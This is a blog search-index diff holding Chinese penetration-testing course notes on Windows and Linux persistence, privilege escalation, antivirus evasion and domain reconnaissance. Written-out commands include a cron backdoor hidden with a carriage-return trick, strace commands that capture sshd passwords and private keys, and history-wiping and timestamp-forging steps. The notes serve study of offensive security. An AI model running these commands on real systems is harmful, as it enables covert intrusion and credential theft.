@@ -143,12 +143,179 @@
 ]]></content>
   </entry>
   <entry>
-    <title></title>
-    <url>/2023/05/29/%E7%AC%AC%E4%BA%8C%E8%AF%BE-%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/</url>
-    <content><![CDATA[<hr>
-<p>title：第二课-社会工程学<br>data：2023-05-20</p>
-<hr>
-<h1 id="第二课-社会工程学"><a href="#第二课-社会工程学" class="headerlink" title="第二课-社会工程学"></a>第二课-社会工程学</h1><h2 id="一、水坑攻击"><a href="#一、水坑攻击" class="headerlink" title="一、水坑攻击"></a><strong>一、水坑攻击</strong></h2><p>通过间接性的方式攻击受害者，比如在其经常访问的网站上做手脚</p>
+    <title>第七课-Windows权限维持</title>
+    <url>/2023/05/23/%E7%AC%AC%E4%B8%83%E8%AF%BE-Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
+    <content><![CDATA[<h1 id="第七课-Windows权限维持"><a href="#第七课-Windows权限维持" class="headerlink" title="第七课-Windows权限维持"></a>第七课-Windows权限维持</h1><h2 id="隐藏技巧"><a href="#隐藏技巧" class="headerlink" title="隐藏技巧"></a>隐藏技巧</h2><p><strong>一、隐藏文件</strong></p>
+<p>使用attrib +s +a +h +r 文件名，进行隐藏</p>
+<p>本质是给文件添加系统文件属性，存档文件属性，只读文件属性和隐藏文件属性</p>
+<p>把+改成-可以显示出，安全扫描软件可以扫描到</p>
+<p><strong>二、系统文件夹图标</strong></p>
+<p>将文件放入新建的文件夹，给文件夹重命名</p>
+<p> <img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171328049.png" alt="image-20230520171328049"></p>
+<p>可以通过命令行查看文件，进入文件夹内部和重命名</p>
+<p><strong>三、畸形目录</strong></p>
+<p>1、无法删除的文件夹</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171337926.png" alt="image-20230520171337926"></p>
+<p>只能通过copy命令行的方式放文件进入</p>
+<p>网页访问局限性大</p>
+<p>2、系统保留文件名</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171343690.png" alt="image-20230520171343690"></p>
+<p>使用命令行copy将文件写入时可以使用保留名，直接创建不行</p>
+<p>命令</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171350761.png" alt="image-20230520171350761"></p>
+<p><strong>四、驱动级文件隐藏</strong></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171400276.png" alt="image-20230520171400276"></p>
+<h2 id="关闭杀软"><a href="#关闭杀软" class="headerlink" title="关闭杀软"></a>关闭杀软</h2><p>msf: run killav命令</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171407007.png" alt="image-20230520171407007"></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171413620.png" alt="image-20230520171413620"></p>
+<h2 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h2><p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171421404.png" alt="image-20230520171421404"></p>
+<p>实现目标关机创建管理员用户</p>
+<p>只删除用户没有作用，关机时会重新创建</p>
+<h2 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h2><p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171430791.png" alt="image-20230520171430791"></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171650036.png" alt="image-20230520171650036"></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171435479.png" alt="image-20230520171435479"></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171640648.png" alt="image-20230520171640648"></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171444323.png" alt="image-20230520171444323"></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171449927.png" alt="image-20230520171449927"></p>
+<p>权限不同可以操作的注册表不同</p>
+<p>注册表触发点不同</p>
+<h2 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h2><p>需要高权限进行操作</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171458796.png" alt="image-20230520171458796"></p>
+<p>启动的不同方式</p>
+<p>系统启动与定时：</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171504660.png" alt="image-20230520171504660"></p>
+<p>用户登录：</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171513716.png" alt="image-20230520171513716"></p>
+<h2 id="新服务"><a href="#新服务" class="headerlink" title="新服务"></a>新服务</h2><p>cmd</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171524192.png" alt="image-20230520171524192"></p>
+<p>powershell</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171528642.png" alt="image-20230520171528642"></p>
+<p>工具SharPersist</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171532973.png" alt="image-20230520171532973"></p>
+<p>msf</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171539132.png" alt="image-20230520171539132"></p>
+<h2 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h2><p>无文件攻击，难溯源</p>
+<p>内存马类型：</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171548232.png" alt="image-20230520171548232"></p>
+<p>弊端，容易销毁(重启服务)</p>
+<h2 id="劫持后门"><a href="#劫持后门" class="headerlink" title="劫持后门"></a>劫持后门</h2><p>exe程序启动时会调用dll文件</p>
+<p>找dll文件时寻找目录是固定的，在比较靠前的目录写入恶意dll，命名为要调用的dll文件名的，达到劫持</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171555131.png" alt="image-20230520171555131"></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171559920.png" alt="image-20230520171559920"></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171607982.png" alt="image-20230520171607982"></p>
+<p>防护时比较容易忽略</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>第三课-免杀</title>
+    <url>/2023/05/21/%E7%AC%AC%E4%B8%89%E8%AF%BE-%E5%85%8D%E6%9D%80/</url>
+    <content><![CDATA[<h1 id="第三课-免杀"><a href="#第三课-免杀" class="headerlink" title="第三课-免杀"></a>第三课-免杀</h1><p><strong>杀毒软件的基本等级</strong></p>
+<p>1、无害</p>
+<p>2、可疑</p>
+<p>3、确认病毒</p>
+<p><strong>静态</strong></p>
+<p>反编译查看源码</p>
+<p>1、代码中的函数</p>
+<p>exe   cshellcode   java shellcode   virtualalloc  rtlmovememory  ntcreatthread等</p>
+<p>2、shellcode特征</p>
+<p>3、文件名称</p>
+<p>4、加密文件</p>
+<p><strong>动态</strong></p>
+<p>沙盒：启发式查杀，通过模拟计算机环境运行，观察特征</p>
+<p>沙盒模拟特征：</p>
+<p>1、内存较小</p>
+<p>2、时间较快</p>
+<p>3、进程或文件不完整</p>
+<p>4、io设备缺失</p>
+<p>在线检测平台：</p>
+<p>virustotal  微步云沙盒</p>
+<p><strong>计算机相关</strong></p>
+<p>由r1或r2挂监控方式，当触发时就会产生事件</p>
+<p>服务</p>
+<p>注册表</p>
+<p>组策略</p>
+<p>防火墙</p>
+<p>敏感程序</p>
+<p>用户(增删改)</p>
+<p><strong>远控的本质</strong></p>
+<p>1、传输消息—》socket连接</p>
+<p>2、命令执行–》dfineClass（执行命令的类）</p>
+<p>3、执行结果回传–》io流</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>第九课-Linux权限维持</title>
+    <url>/2023/05/25/%E7%AC%AC%E4%B9%9D%E8%AF%BE-Linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
+    <content><![CDATA[<h1 id="第九课-Linux权限维持"><a href="#第九课-Linux权限维持" class="headerlink" title="第九课-Linux权限维持"></a>第九课-Linux权限维持</h1><p>windows认证方式</p>
+<p>1、 哈希认证 NTLM</p>
+<p>2、域环境 Kerberos认证</p>
+<p>蜜罐识别：</p>
+<p>看F12中Network</p>
+<h2 id="一、隐藏技巧"><a href="#一、隐藏技巧" class="headerlink" title="一、隐藏技巧"></a>一、隐藏技巧</h2><p><strong>修改文件时间</strong></p>
+<p>touch -r    [选择一个文件]    [上传文件]</p>
+<p>这条命令会把上传文件的时间修改到与选择文件一致</p>
+<p><strong>文件锁定</strong></p>
+<p>chattr +i  [文件]     #锁定文件</p>
+<p>lsattr  [文件]   #查看属性</p>
+<p>chattr -i  [文件]  #解除锁定</p>
+<p><strong>历史操作命令</strong></p>
+<p>1、关闭历史记录</p>
+<p>空格 set +o history</p>
+<p>2、重新打开历史记录</p>
+<p>空格 set -o history</p>
+<p>3、从历史中删除指定命令</p>
+<p>history | grep “命令” #查找包含此命令</p>
+<p>history -d   [查找出的号码]</p>
+<p>4、删除大批量历史</p>
+<p>sed -i ‘保留行数,$d’ .bash_history</p>
+<h2 id="二、添加用户"><a href="#二、添加用户" class="headerlink" title="二、添加用户"></a>二、添加用户</h2><p><strong>passwd写入</strong></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230521151246813.png" alt="image-20230521151246813"></p>
+<p>新版本passwd文件写入失效，写入shadow文件</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230521151535756.png" alt="image-20230521151535756"></p>
+<p>交互式：</p>
+<p>第一种</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230521152419968.png" alt="image-20230521152419968"></p>
+<p>第二种</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230521152256886.png" alt="image-20230521152256886"></p>
+<p>第三种</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230521152233128.png" alt="image-20230521152233128"></p>
+<h2 id="三、SUID"><a href="#三、SUID" class="headerlink" title="三、SUID"></a>三、SUID</h2><p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230521153410270.png" alt="image-20230521153410270"></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230521153946501.png" alt="image-20230521153946501"></p>
+<h2 id="四、SSH公私钥"><a href="#四、SSH公私钥" class="headerlink" title="四、SSH公私钥"></a>四、SSH公私钥</h2><p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230521154711400.png" alt="image-20230521154711400"></p>
+<h2 id="五、软连接"><a href="#五、软连接" class="headerlink" title="五、软连接"></a>五、软连接</h2><p>建立ssh后门（ssh必须开启pam模块，cat /etc/ssh//sshd_config|grep PAM,此命令查看）</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230521155312922.png" alt="image-20230521155312922"></p>
+<p>登录</p>
+<p>ssh <a href="mailto:&#x72;&#111;&#x6f;&#116;&#x40;&#120;&#120;&#x78;&#46;&#x78;&#x78;&#120;&#46;&#120;&#x78;&#x78;&#46;&#x78;&#120;&#120;">&#x72;&#111;&#x6f;&#116;&#x40;&#120;&#120;&#x78;&#46;&#x78;&#x78;&#120;&#46;&#120;&#x78;&#x78;&#46;&#x78;&#120;&#120;</a> -p 端口号</p>
+<p><strong>优点：不需要密码</strong></p>
+<p>低版本可以直接使用，高版本不行</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230521160606361.png" alt="image-20230521160606361"></p>
+<h2 id="六、Crontab"><a href="#六、Crontab" class="headerlink" title="六、Crontab"></a>六、Crontab</h2><p>  在Linux系统中，计划任务⼀般是由cron承担，我们可以把cron设置为开机时⾃动启动。cron启动后，它会读取它  的所有配置⽂件（全局性配置⽂件/etc/crontab，以及每个⽤户的计划任务配置⽂件），然后cron会根据命令和执  ⾏时间来按时来调⽤⼯作任务。  </p>
+<p>  cron表达式在线⽣成：<a href="http://qqe2.com/cron">htt</a><a href="http://qqe2.com/cron">p://qq</a><a href="http://qqe2.com/cron">e2.com/cron</a>  </p>
+<p>命令：</p>
+<p>(crontab -l;echo ‘*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash –noprofile -i’)|crontab </p>
+<p>这样执行crontab -l 就可以看到</p>
+<p>  (crontab  -l;printf “*/1 * * * * /bin/bash /tmp/1.elf;/bin/bash  –noprofile -i;\rno  crontab for  <code>whoami</code>%100c\n”)|crontab -  </p>
+<p>这样执行crontab -l 看到的就是not crontab for 主机名</p>
+<h2 id="七、Cat隐藏"><a href="#七、Cat隐藏" class="headerlink" title="七、Cat隐藏"></a>七、Cat隐藏</h2><p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230521165155900.png" alt="image-20230521165155900"></p>
+<p>利用cat缺陷生成文件，显示想显示的，隐藏不想显示的，可以被cat -A 文件 查看到</p>
+<h2 id="八、strace"><a href="#八、strace" class="headerlink" title="八、strace"></a>八、strace</h2><p>键盘记录工具</p>
+<p>下载命令：</p>
+<p>  yum -y  install strace  </p>
+<p>记录sshd进程明文密码命令：</p>
+<p>  (strace -f -F  -p <code>ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#39;print $2&#39;&#125;</code> -t -e  </p>
+<p>trace=read,write -s 32 2&gt; /tmp/.sshd.log &amp;)、</p>
+<p>查看记录的密码命令：</p>
+<p>  grep -E  ‘read(6, “.+\0\0\0\.+”‘ /tmp/.sshd.log  </p>
+<p>记录sshd私钥命令：</p>
+<p>  (strace -f -F  -p <code>ps aux|grep &quot;sshd -D&quot;|grep -v grep|awk &#123;&#39;print $2&#39;&#125;</code> -t -e  trace=read,write  -s 4096 2&gt; /tmp/.sshd.log &amp;)  </p>
+<p>查看记录的私钥：</p>
+<p>  grep ‘PRIVATE  KEY’ /tmp/.sshd.log  </p>
+]]></content>
+  </entry>
+  <entry>
+    <title>第二课-社会工程学</title>
+    <url>/2023/05/20/%E7%AC%AC%E4%BA%8C%E8%AF%BE-%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/</url>
+    <content><![CDATA[<h1 id="第二课-社会工程学"><a href="#第二课-社会工程学" class="headerlink" title="第二课-社会工程学"></a>第二课-社会工程学</h1><h2 id="一、水坑攻击"><a href="#一、水坑攻击" class="headerlink" title="一、水坑攻击"></a><strong>一、水坑攻击</strong></h2><p>通过间接性的方式攻击受害者，比如在其经常访问的网站上做手脚</p>
 <h2 id="二、html标签学习"><a href="#二、html标签学习" class="headerlink" title="二、html标签学习"></a><strong>二、html标签学习</strong></h2><p><strong>html</strong></p>
 <p>1、table表格标签</p>
 <p>tr行标签</p>
@@ -181,6 +348,240 @@
 <p>SMTP服务+gophish钓鱼平台</p>
 <p><strong>修改图标</strong></p>
 <p>resourcehacker软件</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>第五课-poc的编写</title>
+    <url>/2023/05/22/%E7%AC%AC%E4%BA%94%E8%AF%BE-poc%E7%9A%84%E7%BC%96%E5%86%99/</url>
+    <content><![CDATA[<h1 id="第五课-poc的编写"><a href="#第五课-poc的编写" class="headerlink" title="第五课-poc的编写"></a>第五课-poc的编写</h1><h2 id="脚本如何判断目标是否存在漏洞"><a href="#脚本如何判断目标是否存在漏洞" class="headerlink" title="脚本如何判断目标是否存在漏洞"></a>脚本如何判断目标是否存在漏洞</h2><p><strong>有回显</strong></p>
+<p>1、执行一个命令，判断返回值</p>
+<p>2、ping dnslog ，看dnslog有无信息</p>
+<p>3、有回显的情况下，使用输出函数，输出字符，判断字符是否输出</p>
+<p><strong>无回显</strong></p>
+<p>4、创建文件，判断创建是否成功(需要两步，先创建后访问，较为麻烦)</p>
+<p>5、没有回显，反弹shell</p>
+<p>6、延时</p>
+<h2 id="poc的本质"><a href="#poc的本质" class="headerlink" title="poc的本质"></a>poc的本质</h2><p><strong>编写请求框架</strong></p>
+<p>1、忽略证书的安全性</p>
+<p>2、随机ua头</p>
+<p>3、协议的判断</p>
+<p>4、设置超时时间，包括请求和读取</p>
+<p>5、注意自定义请求头</p>
+<p>7、获取返回结果的请求头</p>
+<p>注意：io流等，需要关流，不然内存会占用</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>第八课-Linux提权</title>
+    <url>/2023/05/24/%E7%AC%AC%E5%85%AB%E8%AF%BE-Linux%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<h1 id="第八课-Linux提权"><a href="#第八课-Linux提权" class="headerlink" title="第八课-Linux提权"></a>第八课-Linux提权</h1><h2 id="一、Linux内核提权"><a href="#一、Linux内核提权" class="headerlink" title="一、Linux内核提权"></a>一、Linux内核提权</h2><p><strong>Cve-2016-5195(脏牛漏洞)</strong></p>
+<p>linux内核&gt;=2.6.22都存在</p>
+<p>脚本地址：<a href="https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c">https://github.com/dirtycow/dirtycow.github.io/blob/master/dirtyc0w.c</a></p>
+<p>exp1：<a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p>
+<p>exp2:   <a href="https://github.com/gbonacini/CVE-2016-5195">https://github.com/gbonacini/CVE-2016-5195</a></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171751584.png" alt="image-20230520171751584"></p>
+<p>没有gcc模块，无法编译，也无法下载，可以在本地搭建内核相同的镜像然后在本地编译上传</p>
+<p>uname -a 获取Linux版本信息</p>
+<p>Linux工具，搜索漏洞:</p>
+<p>searchsploit   版本信息</p>
+<p>辅助内核提权工具：</p>
+<p>linux-exploit-suggester</p>
+<p>linux-exploit-suggester-2</p>
+<h2 id="二、第三方服务提权"><a href="#二、第三方服务提权" class="headerlink" title="二、第三方服务提权"></a>二、第三方服务提权</h2><p>netstat -antup  查看网络服务</p>
+<p><strong>NFS提权</strong></p>
+<p>利用此漏洞需要开启，no_root_sqaush选项</p>
+<p>/etc/exports 文件：</p>
+<p>[共享的目录]   [主机名或ip(参数，参数)]</p>
+<p>查看NFS服务器上的共享目录：</p>
+<p>sudo showmount -e  NFS主机ip</p>
+<p>然后：</p>
+<p> <img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171759124.png" alt="image-20230520171759124"></p>
+<p>/共享文件路径/上传的shell -exec 命令 ;</p>
+<p><strong>git提权</strong></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171804101.png" alt="image-20230520171804101"></p>
+<p><strong>find提权</strong></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171810011.png" alt="image-20230520171810011"></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171814648.png" alt="image-20230520171814648"></p>
+<p><strong>pip提权</strong></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171821300.png" alt="image-20230520171821300"></p>
+<p><strong>zip提权</strong></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171825885.png" alt="image-20230520171825885"></p>
+<p>git,find,pip,zip提权本质为sudo，只是命令不一样</p>
+<h2 id="三、数据库提权"><a href="#三、数据库提权" class="headerlink" title="三、数据库提权"></a>三、数据库提权</h2><p><strong>MySQL UDF提权执行系统命令</strong></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171832185.png" alt="image-20230520171832185"></p>
+<p>然后利用自定义函数提权</p>
+<p>linux下为so文件</p>
+<p>linux上传到固定目录，windows看数据库版本</p>
+<h2 id="四、suid提权"><a href="#四、suid提权" class="headerlink" title="四、suid提权"></a>四、suid提权</h2><p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171836836.png" alt="image-20230520171836836"></p>
+<h2 id="五、计划任务提权"><a href="#五、计划任务提权" class="headerlink" title="五、计划任务提权"></a>五、计划任务提权</h2><p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171843836.png" alt="image-20230520171843836"></p>
+<h2 id="六、sudo提权"><a href="#六、sudo提权" class="headerlink" title="六、sudo提权"></a>六、sudo提权</h2><p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171848188.png" alt="image-20230520171848188"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>第六课-Windows提权</title>
+    <url>/2023/05/23/%E7%AC%AC%E5%85%AD%E8%AF%BE-Windows%E6%8F%90%E6%9D%83/</url>
+    <content><![CDATA[<h1 id="第六课-Windows提权"><a href="#第六课-Windows提权" class="headerlink" title="第六课-Windows提权"></a>第六课-Windows提权</h1><h2 id="一、Windows用户与组"><a href="#一、Windows用户与组" class="headerlink" title="一、Windows用户与组"></a>一、Windows用户与组</h2><p><strong>1、常见用户</strong></p>
+<p>guest</p>
+<p>user(泛指各种企业自建用户)</p>
+<p>administrator</p>
+<p>System</p>
+<p><strong>2、用户相关命令</strong></p>
+<p>net user 查看用户</p>
+<p>net user  用户     查看用户状态</p>
+<p>net user  用户名  密码  /add   添加用户</p>
+<p>net user 用户 /del  删除用户</p>
+<p>net user 用户$ 密码 /add        影子用户</p>
+<p><strong>3、用户组</strong></p>
+<p>net localgroup 查看组信息</p>
+<p>net localgroup 组名  用户名 /add  添加用户到组</p>
+<p>net localgroup 组名   /add 添加组</p>
+<h2 id="二、土豆家族提权"><a href="#二、土豆家族提权" class="headerlink" title="二、土豆家族提权"></a>二、土豆家族提权</h2><p>原理：通过各种方法在本地NTLM-relay中继获取SYSTEM令牌，再模拟令牌执行命令</p>
+<p>chcp 65001 解决命令乱码</p>
+<p><strong>1、提权条件</strong></p>
+<p>(1)、能获取高权限的令牌</p>
+<p>(2)、whoami  /priv查看权限，有必须权限</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171200600.png" alt="image-20230520171200600"></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171204982.png" alt="image-20230520171204982"></p>
+<p><strong>2、JulcyPotato提权</strong></p>
+<p>(1)、实现原理</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171213055.png" alt="image-20230520171213055"></p>
+<p>符合上面两个条件后使用此命令反弹shell获取高权限</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171217716.png" alt="image-20230520171217716"></p>
+<p><strong>3、RoguePotato提权</strong></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171222521.png" alt="image-20230520171222521"></p>
+<p><strong>4、二者区别</strong></p>
+<p>获取token方式不一样</p>
+<h2 id="三、系统配置错误提权-AlwayslnstallElevated"><a href="#三、系统配置错误提权-AlwayslnstallElevated" class="headerlink" title="三、系统配置错误提权-AlwayslnstallElevated"></a>三、系统配置错误提权-AlwayslnstallElevated</h2><p>安装msi文件的时候使用管理员权限</p>
+<h2 id="四、令牌窃取"><a href="#四、令牌窃取" class="headerlink" title="四、令牌窃取"></a>四、令牌窃取</h2><p><strong>1、windows令牌分类</strong></p>
+<p>授权令牌：用于交互会话登录（类似远程桌面登录）</p>
+<p>模拟令牌：用于非交互登录（命令行）</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171232977.png" alt="image-20230520171232977"></p>
+<h2 id="五、内核提权"><a href="#五、内核提权" class="headerlink" title="五、内核提权"></a>五、内核提权</h2><p>系统漏洞利用，未打补丁可以使用</p>
+<h2 id="六、密码收集提权"><a href="#六、密码收集提权" class="headerlink" title="六、密码收集提权"></a>六、密码收集提权</h2><p>密码保存在某处</p>
+<p><strong>1、游览器</strong></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171237310.png" alt="image-20230520171237310"></p>
+<p><strong>2、注册表</strong></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171242606.png" alt="image-20230520171242606"></p>
+<h2 id="七、数据库提权"><a href="#七、数据库提权" class="headerlink" title="七、数据库提权"></a>七、数据库提权</h2><p><strong>1、MySql UDF 提权</strong>（dll文件）</p>
+<p>mysql权限比较高使用</p>
+<p>mysql必须比webshell权限高才有必要</p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171248472.png" alt="image-20230520171248472"></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230520171252602.png" alt="image-20230520171252602"></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>第十课-域渗透_信息收集</title>
+    <url>/2023/05/26/%E7%AC%AC%E5%8D%81%E8%AF%BE-%E5%9F%9F%E6%B8%97%E9%80%8F-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[<h1 id="第十课-域渗透-信息收集"><a href="#第十课-域渗透-信息收集" class="headerlink" title="第十课-域渗透-信息收集"></a>第十课-域渗透-信息收集</h1><h2 id="一、判断自己的身份"><a href="#一、判断自己的身份" class="headerlink" title="一、判断自己的身份"></a>一、判断自己的身份</h2><p>whoami </p>
+<p>非域内机器：看计算机名是否规则，不规则大部分是域外</p>
+<p>域内机器：看前缀</p>
+<h2 id="二、定位DC及获取用户、组信息"><a href="#二、定位DC及获取用户、组信息" class="headerlink" title="二、定位DC及获取用户、组信息"></a>二、定位DC及获取用户、组信息</h2><p>nslookup -qt=ns  域名称 #定位DC</p>
+<p>net time /domain   #查看时间服务器</p>
+<p>hostname   #查看机器名称</p>
+<p>net config workstation  #查询当前登录域及登录用户信息</p>
+<p>net user  /domain      #查询域内⽤户  </p>
+<p>wmic  useraccount get /all     #查询域内⽤户的详细信息 </p>
+<p>net  accounts /domain      #查看域密码策略 </p>
+<p>net user lab /domain  # 查看指定域用户lab的详细信息</p>
+<p>net view /domain #查看有几个域</p>
+<p>net view /domain:xxx  查看域内主机</p>
+<p>net group /domain  # 查看域里面的组</p>
+<p>net group “domain users”  /domain #查看域用户</p>
+<p>net group “domain controllers”  /domain #查看域控制器</p>
+<p>net group “domain computers” /domain #查看域内所有主机</p>
+<p>net group “domain admins” /domain # 查看域管理员，该组内的成员对域控拥有完全控制权</p>
+<p>net group “enterprise admins” /domain #查看企业管理组，该组内的成员对域控拥有完全控制权</p>
+<p>net group “domain guest” /domain #查看域访客组，权限较低</p>
+<p>net accounts /domain #查询域密码策略</p>
+<p>whoami /user #查看用户SID和域SID</p>
+<p>#域控权限</p>
+<p>dsquery user   #查询目录中的用户</p>
+<p>dsquery  computer #查询目录中的主机</p>
+<p>dsquery  group #查询目录中的组</p>
+<p>dsquery  ou #查询目录中的组织单元</p>
+<p>dsquery  site #查询目录中的站点</p>
+<p>dsquery  server #查询域控</p>
+<p>dsquery  contact #查询目录中的联系人</p>
+<p>dsquery  subnet #查询目录中的子网</p>
+<p>dsquery  quota  #查询目录中的配额规定</p>
+<p>dsquery  partition  #查询目录中的分区</p>
+<p>dsquery  server -domain 域名称 | dsget server-dnsname -site  #搜索域内域控制器的DNS主机名和站点名</p>
+<p>dsquery computer domainroot -name -xp -limit n #搜索域内以-xp结尾的机器n台</p>
+<p>dsquery user domainroot -name admin -limit n #搜索域内以admin开头的用户n个</p>
+<p>netdom query pdc #查看主域控制器</p>
+<p>dsquery server  #只能在域控上执行</p>
+<h2 id="三、登录历史"><a href="#三、登录历史" class="headerlink" title="三、登录历史"></a>三、登录历史</h2><p>通过检验注册表里的HKEY_USERS的key值来查询谁登录过机器，同样也调用到了NetSessionEnum API .</p>
+<p>利用NetSessionEnum 来寻找登录sessions，利用NetShareEnum来找寻共享，利用NetWkstaUserEnum来枚举登录的用户。</p>
+<p>1、psloggedon.exe</p>
+<p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p>
+<p>此工具用于查看本地登录的用户和通过本地计算机或远程计算机资源登录的用户</p>
+<p>执行命令：Psloggedon.exe \主机名</p>
+<p>2、PVEFindADUser.exe</p>
+<p><a href="https://github.com/chrisdee/Tools/blob/master/AD/ADFindUsersLoggedOn/PVEFindADUser.exe">https://github.com/chrisdee/Tools/blob/master/AD/ADFindUsersLoggedOn/PVEFindADUser.exe</a></p>
+<p>执行命令: PVEFindADUser.exe  -current -target hostname</p>
+<p>3、PowerView.ps1</p>
+<p><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSpolit/master/Recon/PowerView.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSpolit/master/Recon/PowerView.ps1</a></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230529131311504.png" alt="image-20230529131311504"></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230529131333861.png" alt="image-20230529131333861"></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230529131356507.png" alt="image-20230529131356507"></p>
+<p><img src="https://cheihei.oss-cn-zhangjiakou.aliyuncs.com/image-20230529131418218.png" alt="image-20230529131418218"></p>
+<h2 id="四、域信任关系"><a href="#四、域信任关系" class="headerlink" title="四、域信任关系"></a>四、域信任关系</h2><p>nltest /domain_trusts #查看域信任信息</p>
